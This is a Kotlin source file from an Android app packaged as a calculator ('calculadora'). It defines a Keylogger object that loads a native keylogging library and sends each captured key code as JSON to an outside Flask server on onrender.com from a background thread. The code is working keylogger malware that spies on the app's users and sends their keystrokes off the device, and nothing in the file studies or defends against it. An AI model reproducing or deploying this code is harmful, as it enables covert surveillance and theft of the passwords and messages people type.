package com.agenciacristal.calculadora

import android.util.Log
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL
import com.google.gson.Gson

object Keylogger {
    private const val TAG = "Keylogger"

    init {
        System.loadLibrary("keylogger") // Cargar la librería nativa
    }


    external fun startLogging()


    @Suppress("UNUSED")
    fun sendKeyDataToServer(keyCode: Int) {

        Thread {
            try {

                val gson = Gson()
                val jsonBody = gson.toJson(mapOf("key" to keyCode))
                Log.d(TAG, "Enviando datos al servidor: $jsonBody")

                val serverUrl = "https://flask-server-xysa.onrender.com/log"
                val url = URL(serverUrl)

                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                connection.doOutput = true


                val outputStream: OutputStream = connection.outputStream
                outputStream.write(jsonBody.toByteArray(Charsets.UTF_8))
                outputStream.flush()
                outputStream.close()


                val responseCode = connection.responseCode
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "Datos enviados correctamente")

                    val inputStream = connection.inputStream
                    val response = inputStream.bufferedReader().readText()
                    Log.d(TAG, "Respuesta del servidor: $response")

                } else {
                    Log.e(TAG, "Error al enviar los datos. Código de respuesta: $responseCode")
                }
                connection.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Error en la conexión o al enviar los datos: ${e.message}")
            }
        }.start()
    }
}

